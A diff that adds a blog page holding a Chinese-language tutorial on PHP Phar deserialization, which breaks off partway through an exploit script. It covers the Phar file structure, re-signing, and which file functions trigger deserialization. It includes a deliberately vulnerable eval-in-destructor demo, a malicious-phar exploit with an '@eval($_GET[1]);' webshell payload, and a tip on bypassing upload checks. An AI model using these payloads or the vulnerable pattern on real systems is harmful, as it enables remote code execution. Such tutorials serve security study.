@@ -1,0 +1,777 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Whhxy4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Phar 反序列化0x01 关于 PharPhar 含义Phar 本质上还是一种压缩包，但它是 PHP 的压缩文档，类似于 jar 包在 Java 里面差不多的样子。它可以把多个文件存放至同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句。 默认开启版本 PHP Version &gt;&#x3D; 5.3 Phar 文件结构 在说文件结构之前，我们可以先通过这个脚本生成一个 .phar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phar 反序列化">
+<meta property="og:url" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="W火火">
+<meta property="og:description" content="Phar 反序列化0x01 关于 PharPhar 含义Phar 本质上还是一种压缩包，但它是 PHP 的压缩文档，类似于 jar 包在 Java 里面差不多的样子。它可以把多个文件存放至同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句。 默认开启版本 PHP Version &gt;&#x3D; 5.3 Phar 文件结构 在说文件结构之前，我们可以先通过这个脚本生成一个 .phar">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355044562-9073dd3d-396e-43d2-971f-610fed0cb9cf.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355044718-c78f4945-dbf2-461a-bfa8-79401e2b9bb8.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355047180-4c64b49a-638a-42c2-8700-3d8167c13207.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074068-bfc1db45-de15-4cc1-83cc-f4577a541086.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355046385-60bd4ba9-4e80-473b-840a-089c6e71705b.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074242-09f593fb-af12-45fc-a464-832f6802226c.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074379-88f85dba-bf61-4926-96be-45cf26e1bb15.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355075159-3ccfe32a-9a24-43b3-a73f-5dc85734b851.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355075316-4e9860fd-29f9-4e82-8c6d-3381b696443b.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355080403-d442aea9-0449-4431-8ad5-a244651e697b.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085202-3d2f595f-c4c3-474e-9e61-664ebcaa52a9.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085174-f182e888-7cd9-4a2d-987c-908d68b4223b.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085340-ccd44dd2-4259-401c-8913-bb7e76de2611.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355085715-fc3d1c2b-82e2-4aaa-bb46-9ccfe0b5f7aa.png">
+<meta property="og:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355091265-70f0772d-e618-4b4d-8972-2f2aeb2c7815.png">
+<meta property="article:published_time" content="2023-11-23T02:01:00.000Z">
+<meta property="article:modified_time" content="2023-12-01T15:15:30.094Z">
+<meta property="article:author" content="Whhxy4">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355044562-9073dd3d-396e-43d2-971f-610fed0cb9cf.png">
+  
+  
+  
+  <title>Phar 反序列化 - W火火</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>W火火</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Phar 反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-23 10:01" pubdate>
+          2023年11月23日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          87 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Phar 反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h1><h2 id="0x01-关于-Phar"><a href="#0x01-关于-Phar" class="headerlink" title="0x01 关于 Phar"></a>0x01 关于 Phar</h2><h3 id="Phar-含义"><a href="#Phar-含义" class="headerlink" title="Phar 含义"></a>Phar 含义</h3><p>Phar 本质上还是一种压缩包，但它是 PHP 的压缩文档，类似于 jar 包在 Java 里面差不多的样子。它可以把多个文件存放至同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句。</p>
+<p>默认开启版本 PHP Version &gt;&#x3D; 5.3</p>
+<h3 id="Phar-文件结构"><a href="#Phar-文件结构" class="headerlink" title="Phar 文件结构"></a>Phar 文件结构</h3><ul>
+<li>在说文件结构之前，我们可以先通过这个脚本生成一个 .phar 文件</li>
+</ul>
+<p><strong>ProducePhar.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;qwq&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name . <span class="hljs-string">&quot; is a web vegetable dog &quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-string">&quot;drunkbaby&quot;</span>;<br><span class="hljs-variable">$tttang</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&#x27;drunkbaby.phar&#x27;</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始缓冲 Phar 写操作</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot; &quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$tttang</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>Phar 文件结构大致可分为四个部分</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>、Stub<span class="hljs-comment">//Phar文件头</span><br><span class="hljs-number">2</span>、manifest<span class="hljs-comment">//压缩文件信息</span><br><span class="hljs-number">3</span>、<span class="hljs-built_in">contents</span><span class="hljs-comment">//压缩文件内容</span><br><span class="hljs-number">4</span>、signature<span class="hljs-comment">//签名</span><br></code></pre></td></tr></table></figure>
+
+<p>下面细说一些</p>
+<h4 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h4><p>Stub 是 Phar 的文件标识，也可以理解为它就是 Phar 的文件头，这个 Stub 其实就是一个简单的 PHP 文件，它的格式具有一定的要求，具体如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">xxx<span class="hljs-meta">&lt;?php</span> xxx; <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这行代码的含义，也就是说前面的内容是不限制的，但在该 PHP 语句中，必须有__HALT_COMPILER()，没有这个，PHP 就无法识别出它是 Phar 文件。 这个其实就类似于图片文件头，比如 gif 文件没有 GIF89A 文件头就无法正确的解析图片，010 Editor 里面的 phar 文件头如图</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355044562-9073dd3d-396e-43d2-971f-610fed0cb9cf.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355044562-9073dd3d-396e-43d2-971f-610fed0cb9cf.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h4 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h4><p>a manifest describing the contents，用于存放文件的属性、权限等信息。 这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的 Meta-data</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355044718-c78f4945-dbf2-461a-bfa8-79401e2b9bb8.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355044718-c78f4945-dbf2-461a-bfa8-79401e2b9bb8.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>在我们上面生成的 phar 文件中，manifest 的内容如图</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355047180-4c64b49a-638a-42c2-8700-3d8167c13207.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355047180-4c64b49a-638a-42c2-8700-3d8167c13207.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h4 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h4><p>用于存放 Phar 文件的内容</p>
+<h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>[optional] a signature for verifying Phar integrity (phar file format only),签名(可选参数)，位于文件末尾，具体格式如下</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355074068-bfc1db45-de15-4cc1-83cc-f4577a541086.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074068-bfc1db45-de15-4cc1-83cc-f4577a541086.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>从官方文档中不难看出，签证尾部的 01 代表 md5 加密，02 代表 sha1 加密，04 代表 sha256 加密，08 代表 sha512 加密</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355046385-60bd4ba9-4e80-473b-840a-089c6e71705b.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355046385-60bd4ba9-4e80-473b-840a-089c6e71705b.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名更换签名的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()	<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x02-Phar-反序列化漏洞"><a href="#0x02-Phar-反序列化漏洞" class="headerlink" title="0x02 Phar 反序列化漏洞"></a>0x02 Phar 反序列化漏洞</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Phar 反序列化之所以存在，是因为 Phar 文件中的 manifest 字段存储了序列化的数据，这其实就是用户的 mete-data，PHP 使用 phar_parse_metedata() 函数解析 meta 数据时，会调用 php_var_unserialize() 函数进行反序列化。具体解析代码如下</p>
+<p><strong>php-src&#x2F;ext&#x2F;phar&#x2F;phar.c</strong></p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355074242-09f593fb-af12-45fc-a464-832f6802226c.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074242-09f593fb-af12-45fc-a464-832f6802226c.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>那么该如何触发反序列化呢，一般是配合 Phar 伪协议，伪协议使用较多的是一些文件操作函数，只有这些函数能进行反序列化操作，单纯的 phar:&#x2F;&#x2F; 的伪协议并不能触发反序列化，如 fopen()、copy()、file_exists() 等，具体如下图</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355074379-88f85dba-bf61-4926-96be-45cf26e1bb15.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355074379-88f85dba-bf61-4926-96be-45cf26e1bb15.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>通过两个小 demo 来证明一下 file_get_contents() 可用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;the name is  &#x27;</span>);<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-variable language_">$this</span>-&gt;name);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;   Destruct called&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$tttang</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar://drunkbaby.phar/test.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tttang</span>;<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355075159-3ccfe32a-9a24-43b3-a73f-5dc85734b851.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355075159-3ccfe32a-9a24-43b3-a73f-5dc85734b851.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>成功触发，同样可以试一试其他的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;the name is  &#x27;</span>);<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-variable language_">$this</span>-&gt;name);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;   Destruct called&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$drunkbaby</span> = <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;phar://drunkbaby.phar/test.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$drunkbaby</span>;<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355075316-4e9860fd-29f9-4e82-8c6d-3381b696443b.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355075316-4e9860fd-29f9-4e82-8c6d-3381b696443b.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>这里会打印出的数据有之前在 test.txt 中写入的内容 空格，以及该打印出的 $this-&gt;name 的内容 —— drunkbaby</p>
+<p>所以此处我们可以用一种别样的方式来触发反序列化，回想一下之前 PHP 反序列化的时候，是需要一个 unserialize() 反序列化的入口类的，但是在 Phar 反序列化当中，这一过程更为隐蔽。</p>
+<p>接下来我们简单总结一下利用条件</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1）需要入口，也就是上面能够对 phar 文件进行反序列化的地方。</p>
+<p>2）存在可利用的魔术方法，用魔术方法作为跳板，这其实也就是 POP 链的思想。</p>
+<p>3）文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤。</p>
+<h3 id="简单-Demo"><a href="#简单-Demo" class="headerlink" title="简单 Demo"></a>简单 Demo</h3><p><strong>VulDemo1.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;lol&quot;&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这道 Demo 就是完美满足我们 phar 反序列化攻击的需求，首先存在入口函数 —— file_exists()，其次存在能够利用的魔术方法，魔术方法这里其实写了一个命令执行。并且毫无过滤。</p>
+<p>所以我们直接构造恶意的 phar 文件，EXP 如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;@eval($_GET[1]);&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;poc.phar&#x27;</span>;<span class="hljs-comment">// 后缀必须为phar，否则程序无法运行</span><br><span class="hljs-title function_ invoke__">file_exists</span>(<span 